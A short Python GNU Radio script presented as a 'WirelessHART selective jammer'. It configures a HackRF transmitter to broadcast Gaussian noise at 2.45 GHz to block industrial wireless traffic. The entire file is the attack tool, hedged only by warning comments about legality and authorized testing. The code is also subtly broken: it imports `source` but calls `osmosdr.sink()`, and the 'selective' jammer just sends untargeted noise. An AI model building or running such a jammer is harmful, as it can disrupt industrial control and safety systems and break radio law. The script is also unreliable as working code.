#!/usr/bin/env python3
"""
WirelessHART selective jammer
WARNING: Illegal in most jurisdictions without authorization
"""

from gnuradio import gr, blocks, analog
from osmosdr import source

class WirelessHART_Jammer(gr.top_block):
    def __init__(self):
        gr.top_block.__init__(self)

        # HackRF sink (transmit on 2.4 GHz)
        self.hackrf_sink = osmosdr.sink()
        self.hackrf_sink.set_sample_rate(2e6)
        self.hackrf_sink.set_center_freq(2.45e9)  # Channel 20
        self.hackrf_sink.set_gain(20)

        # Generate noise signal
        self.noise_source = analog.noise_source_c(analog.GR_GAUSSIAN, 1.0)

        # Connect
        self.connect(self.noise_source, self.hackrf_sink)

# WARNING: For authorized testing only
# jammer = WirelessHART_Jammer()
# jammer.start()
